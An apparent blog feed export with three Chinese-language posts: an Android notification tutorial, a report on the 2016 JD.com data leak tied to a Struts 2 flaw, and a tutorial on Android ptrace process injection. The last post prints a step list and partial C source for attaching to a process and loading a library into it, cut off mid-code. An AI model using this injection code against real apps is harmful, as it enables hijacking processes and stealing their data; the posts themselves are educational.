<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> android.app.Notification;</div><div class="line"><span class="keyword">import</span> android.app.NotificationManager;</div><div class="line"><span class="keyword">import</span> android.app.PendingIntent;</div><div class="line"><span class="keyword">import</span> android.content.Intent;</div><div class="line"><span class="keyword">import</span> android.graphics.BitmapFactory;</div><div class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</div><div class="line"><span class="keyword">import</span> android.os.Bundle;</div><div class="line"><span class="keyword">import</span> android.support.v7.app.NotificationCompat;</div><div class="line"><span class="keyword">import</span> android.view.View;</div><div class="line"><span class="keyword">import</span> android.widget.Button;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.activity_main);</div><div class="line">        Button button = (Button) findViewById(R.id.button_notifiy);</div><div class="line">        button.setOnClickListener(<span class="keyword">this</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</div><div class="line">        <span class="keyword">switch</span>(v.getId())</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">case</span> R.id.button_notifiy:</div><div class="line">                Intent intent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>,NotificationActivity.class);</div><div class="line">                <span class="comment">//异步消息</span></div><div class="line">                PendingIntent pi = PendingIntent.getActivity(<span class="keyword">this</span>,<span class="number">0</span>,intent,<span class="number">0</span>);</div><div class="line">                NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);</div><div class="line">                Notification  notification = <span class="keyword">new</span> NotificationCompat.Builder(<span class="keyword">this</span>).setContentText(<span class="string">"This is a Test Notice"</span>)</div><div class="line">                        .setContentTitle(<span class="string">"Notice"</span>).setWhen(System.currentTimeMillis())</div><div class="line">                        .setSmallIcon(R.mipmap.ic_launcher)</div><div class="line">                        .setLargeIcon(BitmapFactory.decodeResource(getResources(),R.mipmap.ic_launcher))</div><div class="line">                        .setContentIntent(pi)           <span class="comment">//延迟处理intent</span></div><div class="line">                        .setAutoCancel(<span class="keyword">true</span>)            <span class="comment">//点击后消失</span></div><div class="line">                        .build();</div><div class="line">                manager.notify(<span class="number">1</span>,notification);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">default</span>:</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>NotificationActivity</code>的布局<br><figure class="highlight xml"><table><tr><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">RelativeLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></div><div class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">"http://schemas.android.com/tools"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:paddingBottom</span>=<span class="string">"@dimen/activity_vertical_margin"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:paddingLeft</span>=<span class="string">"@dimen/activity_horizontal_margin"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:paddingRight</span>=<span class="string">"@dimen/activity_horizontal_margin"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:paddingTop</span>=<span class="string">"@dimen/activity_vertical_margin"</span></span></div><div class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">"com.cn.yllen.notificationtest.NotificationActivity"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">TextView</span></span></div><div class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:layout_centerInParent</span>=<span class="string">"true"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:textSize</span>=<span class="string">"24sp"</span></span></div><div class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">"This is notification layout~~"</span>/&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">RelativeLayout</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>实现如下<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> android.app.NotificationManager;</div><div class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</div><div class="line"><span class="keyword">import</span> android.os.Bundle;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NotificationActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.activity_notification);</div><div class="line">        <span class="comment">//NotificationManager notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);</span></div><div class="line">        <span class="comment">//notificationManager.cancel(1);      //关闭id=1的消息框</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[京东数据泄露事件]]></title>
      <url>/2016/12/11/%E4%BA%AC%E4%B8%9C%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E4%BA%8B%E4%BB%B6/</url>
      <content type="html"><![CDATA[<h2 id="京东数据泄露事件"><a href="#京东数据泄露事件" class="headerlink" title="京东数据泄露事件"></a>京东数据泄露事件</h2><h3 id="0x01本次事件的报道者是名为【一本财经】的微信公众号所发布"><a href="#0x01本次事件的报道者是名为【一本财经】的微信公众号所发布" class="headerlink" title="0x01本次事件的报道者是名为【一本财经】的微信公众号所发布"></a>0x01本次事件的报道者是名为【一本财经】的微信公众号所发布</h3><p><img src="./09-05-28.png" alt=""></p>
<h3 id="0x02事件“主角”京东方面于11日在其运营的【京东黑板报】微信公众号进行了申明，申明如下："><a href="#0x02事件“主角”京东方面于11日在其运营的【京东黑板报】微信公众号进行了申明，申明如下：" class="headerlink" title="0x02事件“主角”京东方面于11日在其运营的【京东黑板报】微信公众号进行了申明，申明如下："></a>0x02事件“主角”京东方面于11日在其运营的【京东黑板报】微信公众号进行了申明，申明如下：</h3><p><img src="./09-05-35.png" alt=""></p>
<h3 id="0x03官方回复是否属实？"><a href="#0x03官方回复是否属实？" class="headerlink" title="0x03官方回复是否属实？"></a>0x03官方回复是否属实？</h3><p>通过相关检索，获取到乌云网镜像数据，从中搜索<code>京东</code>关键字定位到官方提到的<code>Struts 2</code>漏洞，如下：</p>
<p><img src="./09-13-30.jpg" alt=""></p>
<p><img src="./09-14-20.jpg" alt=""><br><code>Struts 2</code> 的漏洞提交从7-17开始到24日逐渐结束，共经历了<code>9</code>天，其中京东对提交的漏洞统一回复为：</p>
<p><img src="./09-18-41.jpg" alt=""></p>
<p>本次<code>京东 泄漏</code>事件 造成的影响:</p>
<p><img src="./09-33-38.jpg" alt=""></p>
<p><img src="./09-34-01.jpg" alt=""></p>
<p><img src="./09-34-29.jpg" alt=""></p>
<h3 id="0x04-对于京东用户导致的影响："><a href="#0x04-对于京东用户导致的影响：" class="headerlink" title="0x04 对于京东用户导致的影响："></a>0x04 对于京东用户导致的影响：</h3><ul>
<li>个人隐私信息泄漏，遭到骚扰或者勒索</li>
<li>个人财产可能被盗用、窃取</li>
</ul>
<h3 id="0x05-小疑问："><a href="#0x05-小疑问：" class="headerlink" title="0x05 小疑问："></a>0x05 小疑问：</h3><ul>
<li>爆料者为何选择这么一个比较特殊的<code>年底</code>,<code>非工作日</code>,<code>双十二前夕</code>日子<code>发难</code>？ </li>
<li>哪里有泄漏的数据？</li>
</ul>
<p>Ref:<br>该漏洞官方介绍地址：<br><code>http://struts.apache.org/docs/s2-016.html</code></p>
<p>以下是 <code>FreeBuf</code>对3年前的漏洞相关文章<code>http://www.freebuf.com/vuls/11220.html</code></p>
<p><code>FreeBuf</code>对此事件的报道：<br><code>http://www.freebuf.com/news/122524.html</code></p>
]]></content>
      
        
        <tags>
            
            <tag> 事件报道 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[android_ptrace_inject]]></title>
      <url>/2016/09/29/%5BMob_Sec_1%5DAndroid_ptrace_inject/</url>
      <content type="html"><![CDATA[<p>##0x1 前文<br><code>注入</code>，Windows平台下一个极其有意思的一门技术，作为绝大多数<code>Hook</code>方案的前奏，当然是各种姿势都有，限于本人能力之有限，会逐渐记录移动端安全相关的学习过程，也希望看到本篇的朋友，能学到一些东西。废话不说了，走起!(<code>以下代码可能存在高度风险性，请勿用于非法用途，一切使用中造成的任何后果，均与本人以及所参考的文章作者无关，继续阅读默认你同意且遵守本括号中的描述</code>)</p>
<p>##0x2 ptrace<br>ptrace是linux系统下用于调试进程用的，具体描述如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">AME</div><div class="line">       ptrace - process trace</div><div class="line">SYNOPSIS</div><div class="line">       #include &lt;sys/ptrace.h&gt;</div><div class="line">       long ptrace(enum __ptrace_request request, pid_t pid,</div><div class="line">                   void *addr, void *data);</div><div class="line">DESCRIPTION</div><div class="line">   The  ptrace()  system  call  provides  a  means by which one process (the &quot;tracer&quot;) may observe and control the execution of another process (the &quot;tracee&quot;), and examine and change the tracee&apos;s memory and registers.  It is primarily used to implement breakpoint debugging and system call tracing.</div></pre></td></tr></table></figure></p>
<p>重点在于<code>第一个参数</code>，可取的值如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">PTRACE_ME</div><div class="line"></div><div class="line">PTRACE_PEEKTEXT</div><div class="line"></div><div class="line">PTRACE_PEEKDATA</div><div class="line"></div><div class="line">PTRACE_PEEKUSER</div><div class="line"></div><div class="line">PTRACE_POKETEXT</div><div class="line"></div><div class="line">PTRACE_POKEDATA</div><div class="line"></div><div class="line">PTRACE_POKEUSER</div><div class="line"></div><div class="line">PTRACE_GETREGS</div><div class="line"></div><div class="line">PTRACE_GETFPREGS,</div><div class="line"></div><div class="line">PTRACE_SETREGS</div><div class="line"></div><div class="line">PTRACE_SETFPREGS</div><div class="line"></div><div class="line">PTRACE_CONT</div><div class="line"></div><div class="line">PTRACE_SYSCALL,</div><div class="line"></div><div class="line">PTRACE_SINGLESTEP</div><div class="line"></div><div class="line">PTRACE_DETACH</div></pre></td></tr></table></figure></p>
<h2 id="0x3-ptrace注入原理"><a href="#0x3-ptrace注入原理" class="headerlink" title="0x3 ptrace注入原理"></a>0x3 ptrace注入原理</h2><p>ptrace注入的原理就是，首先attach到指定进程，这里需要给一个进程的pid，然后通过修改 IP ，指向一段load so的代码，之后获取要执行的函数地址，然后转入执行。大致有两种方式实现：一种是调用dlopen\dlsym然后执行到我们的so模块内，第二种是直接注入一段shellcode。<br>类似于 Windows 下的debug模式进程的注入 ，具体可以参考  <code>http://blog.csdn.net/wowolook/article/details/10055329</code>。</p>
<h2 id="0x4-测试截图"><a href="#0x4-测试截图" class="headerlink" title="0x4 测试截图"></a>0x4 测试截图</h2><p> 首先将编译好的inject 程序拷贝到 /data目录下（android虚拟机或者实体机，需要root权限） ，之后使用 <code>chmod 777 inject</code>，然后输入 <code>./inject</code>回车<br><img src="~/19-47-09.jpg" alt=""><br>注入成功！<br><img src="~/19-47-58.jpg" alt=""><br>日志<br><img src="~/19-48-39.jpg" alt=""><br>需要注意本代码中注入的进程是 <code>com.example.yllen.myapplication</code>，所以当前进程列表中是要存在这个的，实际测试中可以替换为你需要注入的进程名称，或者可以稍微改改支持命令行输入进程名称的，想必聪明的你肯定分分钟搞定。</p>
<p>##0x5 注入流程<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">1. ptrace_attach(pid) 附加到进程</div><div class="line">2. ptrace_getregs(pid,&amp;CurrentRegs) 保存主线程上下文</div><div class="line">3. GetRemoteFuncAddr(pid,libc_path,(void*)mmap); 获取mmap的地址，用来分配一段内存，主要存放so路径、要执行的远程函数名称</div><div class="line">4.设置mmap的参数，然后调用</div><div class="line">5.获取 dlopen、dlsym、dlclose、dlerror函数的地址</div><div class="line"> 	// 分别获取dlopen、dlsym、dlclose等函数的地址</div><div class="line">	dlopen_addr = GetRemoteFuncAddr(pid, linker_path, (void *)dlopen);</div><div class="line">	dlsym_addr = GetRemoteFuncAddr(pid, linker_path, (void *)dlsym);</div><div class="line">	dlclose_addr = GetRemoteFuncAddr(pid, linker_path, (void *)dlclose);</div><div class="line">	dlerror_addr = GetRemoteFuncAddr(pid, linker_path, (void *)dlerror);</div><div class="line">6. ptrace_writedata(pid,RemoteMapMemoryAddr,LibPath,strlen(LibPath)+1) 写入要注入的so文件路径</div><div class="line">7.设置dlopen函数的参数，然后调用,读取返回值(r0)得到起始地址</div><div class="line">8.ptrace_writedata(pid, RemoteMapMemoryAddr + strlen(LibPath) + 2, FunctionName, strlen(FunctionName) + 1) 吸入要执行的函数地址，然后调用dlsym，通过读取返回值(r0)得到函数地址</div><div class="line">9.传递参数(如果有),调用函数</div><div class="line">10. 通过上述步骤，使得自己的函数在指定进程内执行，之后调用ptrace_detach断开进程连接</div><div class="line"></div><div class="line">注：上文所述的ptrace_xx函数都是封装好的ptrace功能函数</div></pre></td></tr></table></figure></p>
<p>##0x6 源代码</p>
<p>下面就是源码了。<br>源文件由4个部分组成，分别为inject.h 、inject.c、main.c、PrintLog.h构成</p>
<ol>
<li>inject.h 、inject.c 注入功能</li>
<li>main.c 发起注入</li>
<li>PrintLog.h 打印日志的封装</li>
</ol>
<p>由于本人对arm汇编并不熟练，所以<code>shellcode</code>版的代码就不贴了，等日后逐渐熟练会一一进行分析。</p>
<h3 id="以下代码为dlopen-dlsym-版ptrace-注入，至于如何防御，等以后有机会再补充。"><a href="#以下代码为dlopen-dlsym-版ptrace-注入，至于如何防御，等以后有机会再补充。" class="headerlink" title="以下代码为dlopen/dlsym 版ptrace 注入，至于如何防御，等以后有机会再补充。"></a>以下代码为dlopen/dlsym 版ptrace 注入，至于如何防御，等以后有机会再补充。</h3><p>先是简单的 PrintLog.h<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"> <span class="comment">/*PrintLog.h*/</span></div><div class="line"> <span class="meta">#<span class="meta-keyword">ifndef</span> _ANDROID_LOG_PRINT_H_</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _ANDROID_LOG_PRINT_H_</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;android/log.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_DEBUG</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> IS_DEBUG</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_TAG (<span class="meta-string">"INJECT"</span>)</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGV(...) ((void)__android_log_print(ANDROID_LOG_VERBOSE, LOG_TAG, __VA_ARGS__))</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGD(...) ((void)__android_log_print(ANDROID_LOG_DEBUG  , LOG_TAG, __VA_ARGS__))</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGI(...) ((void)__android_log_print(ANDROID_LOG_INFO   , LOG_TAG, __VA_ARGS__))</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGW(...) ((void)__android_log_print(ANDROID_LOG_WARN   , LOG_TAG, __VA_ARGS__))</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGE(...) ((void)__android_log_print(ANDROID_LOG_ERROR  , LOG_TAG, __VA_ARGS__))</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGV(LOG_TAG, ...) NULL</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGD(LOG_TAG, ...) NULL</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGI(LOG_TAG, ...) NULL</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGW(LOG_TAG, ...) NULL</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGE(LOG_TAG, ...) NULL</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure></p>
<p> 接下来是 inject.h<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/*inject.h */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;    </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;       </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;   </span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span>  MAX_PATH 0x100</span></div><div class="line"><span class="comment">// dlopen dlsym 注入</span></div><div class="line"> <span class="function"><span class="keyword">int</span> <span class="title">inject_remote_process</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">char</span>* LibPath,<span class="keyword">char</span>* FunctionName,<span class="keyword">long</span>* FuncParameter ,<span class="keyword">long</span> NumParameter)</span></span>;</div></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/*inject.c*/</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;    </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;    </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/user.h&gt;    </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ptrace.h&gt;    </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;    </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;    </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;    </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;    </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;    </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;    </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;    </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;elf.h&gt;    </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;utils/PrintLog.h&gt; </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inject.h&gt;</span></span></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> CPSR_T_MASK     ( 1u &lt;&lt; 5 )</span></div><div class="line"><span class="keyword">const</span> <span class="keyword">char</span> *libc_path = <span class="string">"/system/lib/libc.so"</span>;    </div><div class="line"><span class="keyword">const</span> <span class="keyword">char</span> *linker_path = <span class="string">"/system/bin/linker"</span>;   </div><div class="line"></div><div class="line"><span class="comment">/*************************************************</span></div><div class="line"><span class="comment">  Description:    ptrace使远程进程继续运行</span></div><div class="line"><span class="comment">  Input:          pid表示远程进程的ID</span></div><div class="line"><span class="comment">  Output:         无</span></div><div class="line"><span class="comment">  Return:         返回0表示continue成功，返回-1表示失败</span></div><div class="line"><span class="comment">  Others:         无</span></div><div class="line"><span class="comment">*************************************************/</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_continue</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	<span class="keyword">if</span> (ptrace(PTRACE_CONT, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>) &lt; <span class="number">0</span>)</div><div class="line">	&#123;</div><div class="line">		LOGD(<span class="string">"ptrace cont error, pid:%d"</span>, pid);</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*************************************************</span></div><div class="line"><span class="comment">  Description:    使用ptrace Attach到指定进程</span></div><div class="line"><span class="comment">  Input:          pid表示远程进程的ID</span></div><div class="line"><span class="comment">  Output:         无</span></div><div class="line"><span class="comment">  Return:         返回0表示attach成功，返回-1表示失败</span></div><div class="line"><span class="comment">  Others:         无</span></div><div class="line"><span class="comment">*************************************************/</span>  </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_attach</span><span class="params">(<span class="keyword">pid_t</span> pid)</span>    </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	<span class="keyword">int</span> status = <span class="number">0</span>;</div><div class="line">	</div><div class="line">    <span class="keyword">if</span> (ptrace(PTRACE_ATTACH, pid, <span class="literal">NULL</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;    </div><div class="line">        LOGD(<span class="string">"attach process error, pid:%d"</span>, pid);    </div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </div><div class="line">    &#125;    </div><div class="line">	</div><div class="line"> 	LOGD(<span class="string">"attach process pid:%d"</span>, pid);          </div><div class="line">    waitpid(pid, &amp;status , WUNTRACED);       	</div><div class="line">    </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </div><div class="line">&#125; </div><div class="line"></div><div class="line"><span class="comment">/*************************************************</span></div><div class="line"><span class="comment">  Description:    使用ptrace detach指定进程</span></div><div class="line"><span class="comment">  Input:          pid表示远程进程的ID</span></div><div class="line"><span class="comment">  Output:         无</span></div><div class="line"><span class="comment">  Return:         返回0表示detach成功，返回-1表示失败</span></div><div class="line"><span class="comment">  Others:         无</span></div><div class="line"><span class="comment">*************************************************/</span>    </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_detach</span><span class="params">(<span class="keyword">pid_t</span> pid)</span>    </span></div><div class="line"><span class="function"></span>&#123;    </div><div class="line">    <span class="keyword">if</span> (ptrace(PTRACE_DETACH, pid, <span class="literal">NULL</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;    </div><div class="line">        LOGD(<span class="string">"detach process error, pid:%d"</span>, pid);     </div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </div><div class="line">    &#125;    </div><div class="line">    </div><div class="line">	LOGD(<span class="string">"detach process pid:%d"</span>, pid);  </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*************************************************</span></div><div class="line"><span class="comment">  Description:    使用ptrace获取远程进程的寄存器值</span></div><div class="line"><span class="comment">  Input:          pid表示远程进程的ID，regs为pt_regs结构，存储了寄存器值</span></div><div class="line"><span class="comment">  Output:         无</span></div><div class="line"><span class="comment">  Return:         返回0表示获取寄存器成功，返回-1表示失败</span></div><div class="line"><span class="comment">  Others:         无</span></div><div class="line"><span class="comment">*************************************************/</span> </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_getregs</span><span class="params">(<span class="keyword">pid_t</span> pid, struct pt_regs *regs)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	<span class="keyword">if</span> (ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, regs) &lt; <span class="number">0</span>)</div><div class="line">	&#123;</div><div class="line">		LOGD(<span class="string">"Get Regs error, pid:%d"</span>, pid);</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*************************************************</span></div><div class="line"><span class="comment">  Description:    使用ptrace设置远程进程的寄存器值</span></div><div class="line"><span class="comment">  Input:          pid表示远程进程的ID，regs为pt_regs结构，存储需要修改的寄存器值</span></div><div class="line"><span class="comment">  Output:         无</span></div><div class="line"><span class="comment">  Return:         返回0表示设置寄存器成功，返回-1表示失败</span></div><div class="line"><span class="comment">  Others:         无</span></div><div class="line"><span class="comment">*************************************************/</span> </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_setregs</span><span class="params">(<span class="keyword">pid_t</span> pid, struct pt_regs *regs)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	<span class="keyword">if</span> (ptrace(PTRACE_SETREGS, pid, <span class="literal">NULL</span>, regs) &lt; <span class="number">0</span>)</div><div class="line">	&#123;</div><div class="line">		LOGD(<span class="string">"Set Regs error, pid:%d"</span>, pid);</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*************************************************</span></div><div class="line"><span class="comment">  Description:    获取返回值，ARM处理器中返回值存放在ARM_r0寄存器中</span></div><div class="line"><span class="comment">  Input:          regs存储远程进程当前的寄存器值</span></div><div class="line"><span class="comment">  Output:         无</span></div><div class="line"><span class="comment">  Return:         在ARM处理器下返回r0寄存器值</span></div><div class="line"><span class="comment">  Others:         无</span></div><div class="line"><span class="comment">*************************************************/</span> </div><div class="line"><span class="function"><span class="keyword">long</span> <span class="title">ptrace_getret</span><span class="params">(struct pt_regs * regs)</span>    </span></div><div class="line"><span class="function"></span>&#123;       </div><div class="line">    <span class="keyword">return</span> regs-&gt;ARM_r0;      </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*************************************************</span></div><div class="line"><span class="comment">  Description:    获取当前执行代码的地址，ARM处理器下存放在ARM_pc中</span></div><div class="line"><span class="comment">  Input:          regs存储远程进程当前的寄存器值</span></div><div class="line"><span class="comment">  Output:         无</span></div><div class="line"><span class="comment">  Return:         在ARM处理器下返回pc寄存器值</span></div><div class="line"><span class="comment">  Others:         无</span></div><div class="line"><span class="comment">*************************************************/</span> </div><div class="line"><span class="function"><span class="keyword">long</span> <span class="title">ptrace_getpc</span><span class="params">(struct pt_regs * regs)</span>    </span></div><div class="line"><span class="function"></span>&#123;       </div><div class="line">    <span class="keyword">return</span> regs-&gt;ARM_pc;    </div><div class="line">&#125; </div><div class="line"></div><div class="line"><span class="comment">/*************************************************</span></div><div class="line"><span class="comment">  Description:    使用ptrace从远程进程内存中读取数据</span></div><div class="line"><span class="comment">  Input:          pid表示远程进程的ID，pSrcBuf表示从远程进程读取数据的内存地址</span></div><div class="line"><span class="comment">				  pDestBuf表示用于存储读取出数据的地址，size表示读取数据的大小</span></div><div class="line"><span class="comment">  Output:         无</span></div><div class="line"><span class="comment">  Return:         返回0表示读取数据成功</span></div><div class="line"><span class="comment">  Others:         无</span></div><div class="line"><span class="comment">*************************************************/</span> </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_readdata</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">uint8_t</span> *pSrcBuf, <span class="keyword">uint8_t</span> *pDestBuf, <span class="keyword">uint32_t</span> size)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	<span class="keyword">uint32_t</span> nReadCount = <span class="number">0</span>;</div><div class="line">	<span class="keyword">uint32_t</span> nRemainCount = <span class="number">0</span>;</div><div class="line">	<span class="keyword">uint8_t</span> *pCurSrcBuf = pSrcBuf;</div><div class="line">	<span class="keyword">uint8_t</span> *pCurDestBuf = pDestBuf;</div><div class="line">	<span class="keyword">long</span> lTmpBuf = <span class="number">0</span>;</div><div class="line">	<span class="keyword">uint32_t</span> i = <span class="number">0</span>;	</div><div class="line"> </div><div class="line">	nReadCount = size / <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</div><div class="line">	nRemainCount = size % <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</div><div class="line"></div><div class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nReadCount; i ++ )</div><div class="line">	&#123;</div><div class="line">		lTmpBuf = ptrace(PTRACE_PEEKTEXT, pid, pCurSrcBuf, <span 